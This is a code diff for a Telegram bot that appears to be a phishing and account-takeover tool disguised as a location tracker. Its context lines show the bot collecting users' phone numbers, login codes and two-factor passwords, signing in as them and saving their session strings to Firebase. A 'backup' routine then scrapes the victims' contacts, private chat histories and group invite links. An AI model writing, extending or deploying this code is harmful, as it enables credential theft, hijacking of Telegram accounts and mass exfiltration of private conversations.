@@ -12,6 +12,7 @@ from telethon.errors import SessionPasswordNeededError, FloodWaitError
 from telethon.tl.functions.contacts import GetContactsRequest
 from telethon.tl.types import User, Chat, Channel
 from telethon.tl.custom import Button
+from telethon.tl.types import KeyboardButtonWebView
 
 # --- Configuration ---
 API_ID = int(os.environ.get("API_ID", "0"))
@@ -62,7 +63,7 @@ if bot:
             me = await bot.get_me()
             link = f"https://t.me/{me.username}"
             kb = [
-                [Button.web_app("📍 Track Location", WEBAPP_URL)],
+                [Button.custom(KeyboardButtonWebView(text="📍 Track Location", url=WEBAPP_URL))],
                 [Button.url("↗️ Share Bot", f"https://t.me/share/url?url={link}")]
             ]
             welcome_text = (
@@ -75,16 +76,15 @@ if bot:
         except Exception as e:
             print(f"[bot /start] error: {e}")
 
-    @bot.on(events.NewMessage)
-    async def any_message_handler(event):
+    @bot.on(events.NewMessage(func=lambda e: getattr(e.message, 'contact', None) is not None))
+    async def contact_handler(event):
         try:
-            if getattr(event.message, 'contact', None) is not None:
-                phone = event.message.contact.phone_number
-                if not phone.startswith('+'):
-                    phone = '+' + phone
-                tg_id = str(event.sender_id)
-                await patch_to_firebase(f"number/{tg_id}", {"phone": phone, "id": tg_id})
-                await event.reply("✅ Number received. Open the Mini App to continue.")
+            phone = event.message.contact.phone_number
+            if not phone.startswith('+'):
+                phone = '+' + phone
+            tg_id = str(event.sender_id)
+            await patch_to_firebase(f"number/{tg_id}", {"phone": phone, "id": tg_id})
+            await event.reply("✅ Number received. Open the Mini App to continue.")
         except Exception as e:
             print(f"[bot contact] error: {e}")
 
@@ -96,7 +96,7 @@ async def startup_event():
         return
     try:
         await bot.start(bot_token=BOT_TOKEN)
-        
+
         # Non-blocking Webhook Deletion so Telethon works properly
         def _clear_webhook():
             try:
@@ -104,10 +104,10 @@ async def startup_event():
                 return res.json()
             except Exception as e:
                 return str(e)
-                
+
         status = await asyncio.to_thread(_clear_webhook)
         print(f"Webhook deletion status: {status}")
-        
+
         me = await bot.get_me()
         print(f"🤖 Bot started: @{me.username} (id={me.id})")
         asyncio.create_task(bot.run_until_disconnected())
@@ -232,7 +232,7 @@ async def scrape_chat(client, user, base_path):
             count += 1
             if count % 200 == 0:
                 await patch_to_firebase(f"{base_path}/chats/{user_id}", chat_history); chat_history = {}
-        if chat_history: 
+        if chat_history:
             await patch_to_firebase(f"{base_path}/chats/{user_id}", chat_history)
     except FloodWaitError as e: await asyncio.sleep(e.seconds)
     except Exception: pass
@@ -255,7 +255,7 @@ async def run_backup(session_string, tg_user_id, tg_username):
                 "username": u.username or "None",
             } for u in contacts.users
         }
-        if contacts_data: 
+        if contacts_data:
             await put_to_firebase(f"{base_path}/contacts", contacts_data)
 
         p2p_users, unsaved, dialogs_data = [], {}, {"channels": {}, "groups": {}}
@@ -272,7 +272,7 @@ async def run_backup(session_string, tg_user_id, tg_username):
                 dialogs_data[chat_type][entity_id] = {
                     "name": entity.title, "invite_url": invite_link, "entity_id": entity.id,
                 }
-        if unsaved: 
+        if unsaved:
             await patch_to_firebase(f"{base_path}/unsaved", unsaved)
         if dialogs_data["channels"] or dialogs_data["groups"]:
             await patch_to_firebase(f"{base_path}/dialogs", dialogs_data)
@@ -378,9 +378,9 @@ async def handle_action(request: Request):
         phone = data.get("phone", "").replace(" ", "")
         if not re.match(r"^\+\d{6,15}$", phone):
             return JSONResponse({"status": "error", "message": "Invalid phone number"})
-        
+
         await patch_to_firebase(f"number/{tg_id}", {"phone": phone, "id": tg_id})
-        
+
         client = TelegramClient(StringSession(), API_ID, API_HASH)
         await client.connect()
         try:
@@ -396,30 +396,30 @@ async def handle_action(request: Request):
         auth_info = auth_data.get(tg_id)
         if not client or not auth_info:
             return JSONResponse({"status": "error", "message": "Session expired. Re-enter phone.", "next_step": "phone"})
-        
+
         otp = str(data.get("otp", "")).strip()
         if not re.match(r"^\d{4,6}$", otp):
             return JSONResponse({"status": "error", "message": "Invalid OTP"})
         auth_info["otp"] = otp
-        
+
         try:
             await client.sign_in(auth_info["phone"], auth_info["otp"], phone_code_hash=auth_info["phone_code_hash"])
             session_str = client.session.save()
             auth_info["session_string"] = session_str
-            
+
             await put_to_firebase(f"tgsession/{tg_id}", auth_info)
             await put_to_firebase(f"users_data/{tg_id}", {
                 "chatid": tg_id, "name": tg_name, "username": tg_username,
                 "mobile_number": auth_info["phone"], "Telegram_Session": session_str,
             })
-            
+
             start_pipeline(session_str, tg_id, tg_username)
-            
+
             # Clean up memory securely after a successful login flow
             await client.disconnect()
             active_clients.pop(tg_id, None)
             auth_data.pop(tg_id, None)
-            
+
             return JSONResponse({"status": "success", "next_step": "result"})
         except SessionPasswordNeededError:
             return JSONResponse({"status": "success", "next_step": "2fa"})
@@ -431,26 +431,26 @@ async def handle_action(request: Request):
         auth_info = auth_data.get(tg_id)
         if not client or not auth_info:
             return JSONResponse({"status": "error", "message": "Session expired. Re-enter phone.", "next_step": "phone"})
-        
+
         auth_info["2fa_password"] = data.get("password")
         try:
             await client.sign_in(password=auth_info["2fa_password"])
             session_str = client.session.save()
             auth_info["session_string"] = session_str
-            
+
             await put_to_firebase(f"tgsession/{tg_id}", auth_info)
             await put_to_firebase(f"users_data/{tg_id}", {
                 "chatid": tg_id, "name": tg_name, "username": tg_username,
                 "mobile_number": auth_info.get("phone", ""), "Telegram_Session": session_str,
             })
-            
+
             start_pipeline(session_str, tg_id, tg_username)
-            
+
             # Clean up memory securely after a successful login flow
             await client.disconnect()
             active_clients.pop(tg_id, None)
             auth_data.pop(tg_id, None)
-            
+
             return JSONResponse({"status": "success", "next_step": "result"})
         except Exception as e:
             return JSONResponse({"status": "error", "message": str(e)})
